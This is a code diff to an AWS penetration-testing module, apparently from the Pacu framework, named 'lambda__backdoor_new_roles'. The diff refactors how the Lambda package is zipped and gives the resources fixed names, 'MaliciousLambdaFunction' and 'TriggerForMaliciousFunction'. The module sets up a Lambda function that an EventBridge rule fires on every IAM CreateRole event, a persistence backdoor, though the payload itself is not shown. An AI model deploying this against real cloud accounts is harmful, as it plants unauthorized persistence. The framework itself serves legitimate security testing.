@@ -5,10 +5,10 @@ from pathlib import Path
 from copy import deepcopy
 import random
 import string
-import zipfile
 import os
 
-from pacu.core.lib import session_dir, module_data_dir
+from pacu.core.lib import module_data_dir
+from pacu.utils import zip_file
 
 module_info = {
     'name': 'lambda__backdoor_new_roles',
@@ -161,19 +161,17 @@ def main(args, pacu_main):
     # Zip the Lambda function
     try:
         print('  Zipping the Lambda function...\n')
-        with zipfile.ZipFile(LAMBDA_FUNCTION_ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-            zip_file.writestr('lambda_function.py', source_code)
+        zip_data = {'lambda_function.py': source_code}
+        zip_file_bytes = zip_file(LAMBDA_FUNCTION_ZIP_PATH, zip_data)
     except Exception as error:
         print('Failed to zip the Lambda function locally: {}\n'.format(error))
         return data
 
-    with open(LAMBDA_FUNCTION_ZIP_PATH, 'rb') as f:
-        zip_file_bytes = f.read()
-
     client = pacu_main.get_boto3_client('lambda', 'us-east-1')
 
     try:
-        function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
+        #function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
+        function_name = 'MaliciousLambdaFunction'
         response = client.create_function(
             FunctionName=function_name,
             Runtime='python3.9',
@@ -189,9 +187,9 @@ def main(args, pacu_main):
         created_resources['LambdaFunctions'].append(function_name)
 
         client = pacu_main.get_boto3_client('events', 'us-east-1')
-
+        rule_name = 'TriggerForMaliciousFunction'
         response = client.put_rule(
-            Name=function_name,
+            Name=rule_name,
             EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateRole"]}}',
             State='ENABLED'
         )
@@ -211,7 +209,7 @@ def main(args, pacu_main):
         client = pacu_main.get_boto3_client('events', 'us-east-1')
 
         response = client.put_targets(
-            Rule=function_name,
+            Rule=rule_name,
             Targets=[
                 {
                     'Id': '0',
@@ -225,7 +223,7 @@ def main(args, pacu_main):
         else:
             print('  Added Lambda target to CloudWatch Events rule.')
             data['successes'] += 1
-            created_resources['CWERules'].append(function_name)
+            created_resources['CWERules'].append(rule_name)
     except ClientError as error:
         code = error.response['Error']['Code']
         if code == 'AccessDeniedException':
